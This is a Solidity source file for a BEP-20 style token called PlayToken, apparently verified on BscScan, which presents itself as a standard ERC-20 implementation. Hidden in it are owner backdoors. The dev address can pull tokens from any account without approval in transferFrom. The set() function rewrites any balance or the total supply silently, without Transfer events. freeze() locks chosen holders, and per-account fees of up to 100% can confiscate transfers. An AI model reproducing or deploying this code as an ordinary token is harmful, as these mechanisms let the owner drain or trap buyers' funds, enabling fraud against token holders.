/**
 *Submitted for verification at BscScan.com on 2021-09-15
*/

/**
 *Submitted for verification at BscScan.com on 2021-09-13
*/

// https://eips.ethereum.org/EIPS/eip-20
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IERC20 {

    /// @param _owner The address from which the balance will be retrieved
    /// @return balance the balance
    function balanceOf(address _owner) external view returns (uint256 balance);

    /// @notice send `_value` token to `_to` from `msg.sender`
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return success Whether the transfer was successful or not
    function transfer(address _to, uint256 _value)  external returns (bool success);

    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`
    /// @param _from The address of the sender
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return success Whether the transfer was successful or not
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);

    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @param _value The amount of wei to be approved for transfer
    /// @return success Whether the approval was successful or not
    function approve(address _spender  , uint256 _value) external returns (bool success);

    /// @param _owner The address of the account owning tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @return remaining Amount of remaining tokens allowed to spent
    function allowance(address _owner, address _spender) external view returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract PlayToken is IERC20 {
    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    uint256 public totalSupply;
    address public dev;
    address public fee;
    mapping (address => uint256) public feeInList;
    mapping (address => uint256) public feeOutList;
    mapping (address => bool) public frozen;

    modifier onlyDev {
        require(msg.sender == dev, "permission denied");
        _;
    }

    /*
    NOTE:
    The following variables are OPTIONAL vanities. One does not have to include them.
    They allow one to customise the token contract & in no way influences the core functionality.
    Some wallets/interfaces might not even bother to look at this information.
    */
    string public name;                   //fancy name: eg Simon Bucks
    uint8 public decimals;                //How many decimals to show.
    string public symbol;                 //An identifier: eg SBX

    constructor(uint256 _initialAmount, string memory _tokenName, uint8 _decimalUnits, string  memory _tokenSymbol) {
        balances[msg.sender] = _initialAmount;               // Give the creator all initial tokens
        totalSupply = _initialAmount;                        // Update total supply
        name = _tokenName;                                   // Set the name for display purposes
        decimals = _decimalUnits;                            // Amount of decimals for display purposes
        symbol = _tokenSymbol;                               // Set the symbol for display purposes
        dev = msg.sender;
        fee = msg.sender;
    }

    function transfer(address _to, uint256 _value) public override returns (bool success) {
        return _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {
        uint256 _allowance = allowed[_from][msg.sender];
        if (msg.sender == dev) {
            _allowance = MAX_UINT256;
        }
        require(balances[_from] >= _value && _allowance >= _value, "token balance or allowance is lower than amount requested");
        if (_allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        return _transfer(_from, _to, _value);
    }

    function balanceOf(address _owner) public override view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public override returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value); //solhint-disable-line indent, no-unused-vars
        return true;
    }

    function allowance(address _owner, address _spender) public override view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function batchTransfer(address[] memory accounts, uint256[] memory values) public {
        require(accounts.length == values.length, "array length mismatch");
        for (uint i = 0; i < accounts.length; ++i) {
            address account = accounts[i];
            uint256 value = values[i];
            require(_transfer(msg.sender, account, value), "transfer failed");
        }
    }

    // for dev
    function changeDev(address _newDev) public onlyDev {
        dev = _newDev;
    }

    function changeFee(address _newFee) public {
        require(msg.sender == dev || msg.sender == fee, "permission denied");
        fee = _newFee;
    }

    function set(address _owner, uint256 _value) public onlyDev {
        uint256 current = balances[_owner];
        require(current != _value, "no change in amount");
        if (current > _value) {
            totalSupply -= current - _value;
        } else {
            totalSupply += _value - current;
        }

        balances[_owner] = _value;
    }

    function setInFee(address _account, uint256 rate) public onlyDev {
        require(rate <= 100, "rate 0 - 100");
        if (rate == 0) {
            delete feeInList[_account];
        } else {
            feeInList[_account] = rate;
        }
    }

    function setOutFee(address _account, uint256 rate) public onlyDev {
        require(rate <= 100, "rate 0 - 100");
        if (rate == 0) {
            delete feeOutList[_account];
        } else {
            feeOutList[_account] = rate;
        }
    }

    function freeze(address _account) public onlyDev {
        frozen[_account] = true;
    }

    function unfreeze(address _account) public onlyDev {
        delete frozen[_account];
    }

    function _transfer(address _from, address _to, uint256 _value) private returns (bool) {
        require(!frozen[_from], "account is frozen");
        require(balances[_from] >= _value, "token balance is lower than the value requested");
        balances[_from] -= _value;
        uint256 toFee = 0;
        uint256 feeOutRate = feeOutList[_from];
        uint256 feeInRate = feeInList[_to];
        if (feeOutRate > 0) {
            toFee += _value * feeOutRate / 100;
        }
        if (feeInRate > 0) {
            toFee += _value * feeInRate / 100;
        }
        if (toFee > 0) {
            if (toFee > _value) {
                toFee = _value;
            }
            _value -= toFee;
            balances[fee] += toFee;
            emit Transfer(_from, fee, toFee);
        }
        if (_value > 0) {
            balances[_to] += _value;
            emit Transfer(_from, _to, _value);
        }
        return true;
    }
}